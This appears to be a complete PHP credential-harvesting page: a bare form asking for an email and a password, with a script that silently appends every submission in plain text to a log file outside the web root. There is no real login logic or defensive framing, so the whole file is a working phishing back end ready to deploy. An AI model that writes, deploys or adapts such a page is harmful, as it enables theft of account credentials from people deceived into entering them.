<?php
file_put_contents('../logs.txt', 'Email: '.$_POST['email'].' Password: '.$_POST['pass']."\n", FILE_APPEND);
?>
<form method='POST'><input name='email'><input name='pass'><input type='submit'></form>